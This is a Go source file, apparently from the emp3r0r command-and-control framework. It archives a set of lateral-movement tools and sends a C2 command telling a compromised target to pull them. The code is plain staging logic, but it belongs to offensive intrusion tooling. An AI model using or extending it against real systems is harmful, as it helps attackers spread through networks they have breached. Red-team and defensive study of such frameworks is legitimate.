//go:build linux
// +build linux

package cc

import (
	"fmt"
	"os"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleVaccine() {
	go func() {
		err := CreateVaccineArchive()
		if err != nil {
			CliPrintError("CreateVaccineArchive: %v", err)
			return
		}
		err = SendCmd(emp3r0r_data.C2CmdUtils, "", CurrentTarget)
		if err != nil {
			CliPrintError("SendCmd failed: %v", err)
		}
	}()
}

func CreateVaccineArchive() (err error) {
	CliPrintInfo("Creating archive (%s) for module vaccine...", UtilsArchive)
	err = os.Chdir(EmpDataDir + "/modules/vaccine") // vaccine is always stored under EmpDataDir
	if err != nil {
		return fmt.Errorf("Entering vaccine dir: %v", err)
	}
	defer func() {
		CliPrintInfo("Created %.2fMB archive (%s) for module vaccine", float64(util.FileSize(UtilsArchive))/1024/1024, UtilsArchive)
		os.Chdir(EmpWorkSpace)
	}()
	err = util.TarXZ(".", UtilsArchive)
	if err != nil {
		return fmt.Errorf("Creating vaccine archive: %v", err)
	}
	return
}
